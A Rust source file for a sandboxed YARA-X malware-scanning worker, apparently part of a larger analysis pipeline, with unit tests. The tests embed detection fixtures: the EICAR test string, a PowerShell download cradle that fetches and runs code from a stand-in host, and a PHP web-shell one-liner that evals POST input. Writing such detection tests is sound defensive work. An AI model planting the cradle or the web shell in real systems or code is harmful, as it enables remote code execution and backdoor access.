// mal-static-yara is a single-use, credential-less worker. in production it runs
// inside a locked-down container (empty netns, seccomp, cap-drop, read-only
// rootfs, tmpfs scratch) and scans exactly one artifact with YARA-X. the sample
// arrives read-only at /in/sample; the result leaves as one json line on stdout,
// which an isolated broker validates before any trusted process reads it. the
// worker holds no network and no store credential. see docs/M0-FIRST-COMMIT.md.
//
// YARA-X runs in-process here on purpose: the worker IS the sandbox, so parsing
// hostile bytes in it is exactly what it is for. rules are TRUSTED input baked
// into the image (the whole rules/ tree, see rules/README.md); the SAMPLE is
// the hostile input.
//
// rules are self-describing: each carries `verdict` and `attck` in its meta,
// and the worker reads those instead of hardcoding a mapping. a matched rule
// with no verdict meta defaults to SUSPICIOUS, never benign.

use std::io::Write;

use include_dir::{include_dir, Dir};
use serde::Serialize;
use yara_x::MetaValue;

static RULES_DIR: Dir = include_dir!("$CARGO_MANIFEST_DIR/rules");

#[derive(Serialize)]
struct Finding {
    engine: String,
    #[serde(rename = "type")]
    kind: String,
    detail: String, // the rule that matched
    attck: String,
    verdict: String,
}

#[derive(Serialize)]
struct Report {
    engine: String,
    findings: Vec<Finding>,
    verdict: String, // worker-local rolled-up verdict; the orchestrator re-rolls
    incomplete: bool,
}

fn rank(v: &str) -> i32 {
    match v {
        "MALICIOUS" => 3,
        "SUSPICIOUS" => 2,
        "UNKNOWN" => 1,
        _ => 0, // BENIGN
    }
}

// normalize keeps a rule's declared verdict inside the lattice; anything
// unrecognized reads as SUSPICIOUS (fail-closed), never benign.
fn normalize(v: &str) -> &'static str {
    match v.to_ascii_uppercase().as_str() {
        "BENIGN" => "BENIGN",
        "UNKNOWN" => "UNKNOWN",
        "MALICIOUS" => "MALICIOUS",
        _ => "SUSPICIOUS",
    }
}

// compile every .yar under the embedded rules tree. a file that fails to
// compile (for example a community rule using an unsupported module) is
// skipped and counted, never fatal, so one bad pack cannot blind the engine.
fn compile_rules() -> Result<(yara_x::Rules, usize), String> {
    let mut compiler = yara_x::Compiler::new();
    let mut added = 0usize;
    let mut skipped = 0usize;
    add_dir(&RULES_DIR, &mut compiler, &mut added, &mut skipped);
    if added == 0 {
        return Err(format!("no rules compiled ({skipped} skipped)"));
    }
    Ok((compiler.build(), skipped))
}

fn add_dir(dir: &Dir, compiler: &mut yara_x::Compiler, added: &mut usize, skipped: &mut usize) {
    for f in dir.files() {
        if f.path().extension().and_then(|e| e.to_str()) == Some("yar") {
            match f.contents_utf8() {
                Some(src) if compiler.add_source(src).is_ok() => *added += 1,
                _ => *skipped += 1,
            }
        }
    }
    for sub in dir.dirs() {
        add_dir(sub, compiler, added, skipped);
    }
}

fn main() {
    let path = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "/in/sample".to_string());

    let (rules, skipped) = match compile_rules() {
        Ok(r) => r,
        Err(e) => return fail(&format!("rule compile failed: {e}")),
    };
    let data = match std::fs::read(&path) {
        Ok(d) => d,
        Err(e) => return fail(&format!("cannot read sample: {e}")),
    };
    let mut scanner = yara_x::Scanner::new(&rules);
    let results = match scanner.scan(&data) {
        Ok(s) => s,
        Err(e) => return fail(&format!("scan failed: {e}")),
    };

    let mut findings = Vec::new();
    let mut worst = "UNKNOWN";
    for r in results.matching_rules() {
        let name = r.identifier().to_string();
        let (verdict, attck) = classify(&r);
        if rank(verdict) > rank(worst) {
            worst = verdict;
        }
        findings.push(Finding {
            engine: "mal-static-yara".into(),
            kind: "yara".into(),
            detail: name,
            attck,
            verdict: verdict.into(),
        });
    }

    // a rule file we could not compile is a coverage gap: report it honestly by
    // flagging the run incomplete, but do not floor a clean scan on its own.
    emit(Report {
        engine: "mal-static-yara".into(),
        findings,
        verdict: worst.into(),
        incomplete: skipped > 0,
    });
}

// classify reads the matched rule's own metadata: `verdict` and `attck`. a
// matched rule that declares no verdict defaults to SUSPICIOUS (a hit of
// unstated severity is suspicious, never benign).
fn classify(rule: &yara_x::Rule) -> (&'static str, String) {
    let mut verdict = "SUSPICIOUS";
    let mut attck = String::new();
    for (key, value) in rule.metadata() {
        if let MetaValue::String(s) = value {
            match key {
                "verdict" => verdict = normalize(s),
                "attck" => attck = s.to_string(),
                _ => {}
            }
        }
    }
    (verdict, attck)
}

// fail-closed: if the worker cannot analyze, it reports SUSPICIOUS + incomplete.
// it never emits BENIGN by omission.
fn fail(msg: &str) {
    emit(Report {
        engine: "mal-static-yara".into(),
        findings: vec![Finding {
            engine: "mal-static-yara".into(),
            kind: "error".into(),
            detail: msg.to_string(),
            attck: String::new(),
            verdict: "SUSPICIOUS".into(),
        }],
        verdict: "SUSPICIOUS".into(),
        incomplete: true,
    });
}

fn emit(r: Report) {
    let mut out = std::io::stdout();
    let _ = serde_json::to_writer(&mut out, &r);
    let _ = out.write_all(b"\n");
}

#[cfg(test)]
mod tests {
    use super::*;

    fn eicar() -> Vec<u8> {
        format!(
            "{}{}",
            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        )
        .into_bytes()
    }

    fn scan(data: &[u8]) -> Vec<(String, String, String)> {
        let (rules, _) = compile_rules().expect("baked rules must compile");
        let mut scanner = yara_x::Scanner::new(&rules);
        let results = scanner.scan(data).expect("scan");
        results
            .matching_rules()
            .map(|r| {
                let (v, a) = classify(&r);
                (r.identifier().to_string(), v.to_string(), a)
            })
            .collect()
    }

    #[test]
    fn all_baked_rules_compile() {
        let (_, skipped) = compile_rules().expect("rules compile");
        assert_eq!(
            skipped, 0,
            "every first-party rule must compile under yara-x"
        );
    }

    #[test]
    fn eicar_matches_malicious_from_meta() {
        let hits = scan(&eicar());
        let e = hits
            .iter()
            .find(|(n, _, _)| n == "eicar_test_file")
            .expect("eicar hit");
        assert_eq!(e.1, "MALICIOUS");
        assert_eq!(e.2, "T1204");
    }

    #[test]
    fn powershell_cradle_detected() {
        let sample = b"$c = IEX (New-Object Net.WebClient).DownloadString('http://x/y')";
        let hits = scan(sample);
        let h = hits
            .iter()
            .find(|(n, _, _)| n == "powershell_download_cradle")
            .expect("cradle hit");
        assert_eq!(h.1, "MALICIOUS");
        assert_eq!(h.2, "T1059.001");
    }

    #[test]
    fn php_webshell_detected() {
        let hits = scan(b"<?php @eval($_POST['x']); ?>");
        assert!(hits
            .iter()
            .any(|(n, v, _)| n == "webshell_php_eval_superglobal" && v == "MALICIOUS"));
    }

    #[test]
    fn benign_content_matches_nothing() {
        assert!(scan(b"just a plain text file with nothing interesting").is_empty());
        assert!(scan(b"package main\nfunc main() { eval := 1; _ = eval }\n").is_empty());
        assert!(scan(b"").is_empty());
    }

    #[test]
    fn unknown_verdict_meta_defaults_suspicious() {
        assert_eq!(normalize("wat"), "SUSPICIOUS");
        assert_eq!(normalize("malicious"), "MALICIOUS");
        assert_eq!(normalize("BENIGN"), "BENIGN");
    }

    #[test]
    fn rank_orders_the_lattice() {
        assert!(rank("MALICIOUS") > rank("SUSPICIOUS"));
        assert!(rank("SUSPICIOUS") > rank("UNKNOWN"));
        assert!(rank("UNKNOWN") > rank("BENIGN"));
    }
}
